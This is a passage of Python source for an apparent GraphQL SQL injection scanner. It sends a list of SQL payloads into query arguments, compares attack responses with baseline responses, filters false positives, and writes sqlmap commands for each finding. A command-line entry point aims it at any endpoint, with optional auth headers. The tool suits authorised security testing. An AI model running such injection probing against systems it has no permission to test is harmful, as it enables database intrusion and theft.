                base_field_val = get_field_from_response(base_resp.get("data") if base_resp else None, field_name)
                attack_field_val = get_field_from_response(attack_resp.get("data"), field_name)
                if base_field_val not in (None, {}, []) and attack_field_val in (None, {}, []) and not base_has_error:
                    marker_path = write_or_update_marker(
                        endpoint, headers, attack_q_str, field_name, target_arg_name, payload,
                        {k: v for k, v in attack_args.items() if k != target_arg_name},
                        "NULL_ON_ATTACK", "Null returned on attack while baseline had data")
                    temp_findings[key].append({
                        "field": field_name, "arg": target_arg_name, "payload": payload,
                        "args_used": attack_args.copy(), "type": "NULL_ON_ATTACK",
                        "evidence": "Null returned on attack while baseline had data",
                        "base_response": base_resp.get("data") if base_resp else None,
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(marker_path),
                        "repro": marker_path,
                    })
                    continue

                if simple_field_value not in (None, {}, []) and simple_base_norm and attack_norm and simple_base_norm != attack_norm:
                    marker_path = write_or_update_marker(
                        endpoint, headers, attack_q_str, field_name, target_arg_name, payload,
                        {k: v for k, v in attack_args.items() if k != target_arg_name},
                        "RESPONSE_DIFF_SIMPLE", "Simple baseline __typename differs from attack")
                    temp_findings[key].append({
                        "field": field_name, "arg": target_arg_name, "payload": payload,
                        "args_used": attack_args.copy(), "type": "RESPONSE_DIFF_SIMPLE",
                        "evidence": "Simple baseline __typename differs from attack",
                        "base_response": simple_base_resp.get("data"),
                        "attack_response": attack_resp.get("data"),
                        "recommended_cmd": _build_sqlmap_cmd_marker(marker_path),
                        "repro": marker_path,
                    })
                    continue

            # --- Fallback simple loop (target arg only, __typename selection) ---
            # Skip if the primary loop already produced SQL error evidence — no benefit.
            _already_has_sql_err = any(i.get("type", "").startswith("SQL_ERROR") for i in temp_findings[key])
            if not _already_has_sql_err:
                for payload in PAYLOADS:
                    simple_atk_args = {target_arg_name: payload}
                    simple_atk_q_str = build_query(field_name, simple_atk_args, "__typename").get("query", "")
                    simple_atk_resp = post_graphql(endpoint, headers, {"query": simple_atk_q_str}, verbose=verbose)

                    missing_arg = detect_missing_required_arg(simple_atk_resp.get("data"))
                    if missing_arg:
                        candidate = (base_values.get(missing_arg) or [None])[0] or \
                                    (simple_name_match_values(missing_arg, extracted_values) or [None])[0]
                        if candidate:
                            simple_atk_args[missing_arg] = candidate
                            simple_atk_q_str = build_query(field_name, simple_atk_args, "__typename").get("query", "")
                            simple_atk_resp = post_graphql(endpoint, headers, {"query": simple_atk_q_str}, verbose=verbose)
                        else:
                            continue

                    if detect_graphql_syntax_error(simple_atk_resp.get("data")):
                        continue

                    sa_norm = normalize_resp(simple_atk_resp.get("data"))
                    sa_err = check_sql_error_in_response(simple_atk_resp.get("data"))

                    if sa_err:
                        marker_path = write_or_update_marker(
                            endpoint, headers, simple_atk_q_str, field_name, target_arg_name,
                            payload, {}, "SQL_ERROR", sa_err.get("evidence"))
                        temp_findings[key].append({
                            "field": field_name, "arg": target_arg_name, "payload": payload,
                            "args_used": {target_arg_name: payload},
                            "type": "SQL_ERROR_IN_RESPONSE_SIMPLE",
                            "evidence": sa_err["evidence"],
                            "base_response": simple_base_resp.get("data"),
                            "attack_response": simple_atk_resp.get("data"),
                            "recommended_cmd": _build_sqlmap_cmd_marker(marker_path),
                            "repro": marker_path,
                        })
                        break

                    if simple_field_value not in (None, {}, []) and simple_base_norm and sa_norm and simple_base_norm != sa_norm:
                        marker_path = write_or_update_marker(
                            endpoint, headers, simple_atk_q_str, field_name, target_arg_name,
                            payload, {}, "RESPONSE_DIFF_SIMPLE",
                            "Simple baseline __typename differs from attack")
                        temp_findings[key].append({
                            "field": field_name, "arg": target_arg_name, "payload": payload,
                            "args_used": {target_arg_name: payload},
                            "type": "RESPONSE_DIFF_SIMPLE",
                            "evidence": "Simple baseline __typename differs from attack",
                            "base_response": simple_base_resp.get("data"),
                            "attack_response": simple_atk_resp.get("data"),
                            "recommended_cmd": _build_sqlmap_cmd_marker(marker_path),
                            "repro": marker_path,
                        })
                        break

    # --- Confirmation rules (reduce false positives before returning) ---
    final_findings: List[Dict[str, Any]] = []
    for (field_name, arg_name), items in temp_findings.items():
        # Discard if every attack response returned null AND there are no SQL errors
        all_attack_null = True
        for it in items:
            atk = it.get("attack_response")
            val = None
            if isinstance(atk, dict):
                try:
                    val = (atk.get("data") or {}).get(field_name) if isinstance(atk.get("data"), dict) else atk.get(field_name)
                except Exception:
                    pass
            if val not in (None, {}, []):
                all_attack_null = False
                break
            elif not isinstance(atk, dict):
                all_attack_null = False
                break
        if all_attack_null and not any(i.get("type", "").startswith("SQL_ERROR") for i in items):
            continue

        types_present = {i.get("type") for i in items}
        payloads_present = {i.get("payload") for i in items}
        has_sql_err = any(i.get("type", "").startswith("SQL_ERROR") for i in items)
        has_null = any(i.get("type") == "NULL_ON_ATTACK" for i in items)

        if has_sql_err:
            final_findings.extend(i for i in items if i.get("type", "").startswith("SQL_ERROR"))
        elif len(payloads_present) >= 2:
            seen_p: Set = set()
            for i in items:
                p = i.get("payload")
                if p not in seen_p:
                    final_findings.append(i)
                    seen_p.add(p)
        elif has_null:
            final_findings.extend(i for i in items if i.get("type") == "NULL_ON_ATTACK")
        elif "RESPONSE_DIFF" in types_present and "RESPONSE_DIFF_SIMPLE" in types_present:
            rep = next((i for i in items if i.get("type") in ("RESPONSE_DIFF", "RESPONSE_DIFF_SIMPLE")), None)
            if rep:
                final_findings.append(rep)

    return final_findings

# -------------------- CLI / main ------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="GraphQL SQLi detector — tests string arguments with SQL payloads",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 sqli/sqli_detector.py https://target.com/graphql\n"
            "  python3 sqli/sqli_detector.py https://target.com/graphql "
            "'{\"Authorization\":\"Bearer TOKEN\"}'\n"
            "  python3 sqli/sqli_detector.py https://target.com/graphql --crawl --verbose\n"
        ),
    )
    parser.add_argument("endpoint", help="GraphQL endpoint URL")
    parser.add_argument("headers", nargs="?", default=None,
                        help="Optional headers as JSON object or 'Name: Value' pairs")
    parser.add_argument("--crawl", action="store_true",
                        help="BFS crawl to extract values for smarter argument seeding (opt-in)")
    parser.add_argument("--crawl-depth", type=int, default=2,
                        help="Max crawl depth (default: 2)")
    parser.add_argument("--max-requests", type=int, default=250,
                        help="Max requests during crawl (default: 250)")
    parser.add_argument("--max-items", type=int, default=10,
                        help="Items per list to inspect during crawl (default: 10)")
    parser.add_argument("--crawl-delay", type=float, default=0.0,
                        help="Delay between crawl requests in seconds (default: 0.0)")
    parser.add_argument("--verbose", action="store_true",
                        help="Print queries and debug information")
    args = parser.parse_args()

    if args.crawl_depth < 1:
        print("[!] --crawl-depth must be >= 1", file=sys.stderr)
        sys.exit(1)
    if args.max_requests < 1:
        print("[!] --max-requests must be >= 1", file=sys.stderr)
        sys.exit(1)
    if args.max_items < 1:
        print("[!] --max-items must be >= 1", file=sys.stderr)
        sys.exit(1)
    if args.crawl_delay < 0:
        print("[!] --crawl-delay must be >= 0", file=sys.stderr)
        sys.exit(1)

    headers = parse_headers_input(args.headers)
    findings = run_detector(
        args.endpoint, headers,
        crawl=args.crawl,
        crawl_depth=args.crawl_depth,
        max_requests=args.max_requests,
        max_items=args.max_items,
        crawl_delay=args.crawl_delay,
        verbose=args.verbose,
    )

    grouped = group_findings_by_param(findings, args.endpoint)
    print_grouped_summary(grouped)

if __name__ == "__main__":
    main()
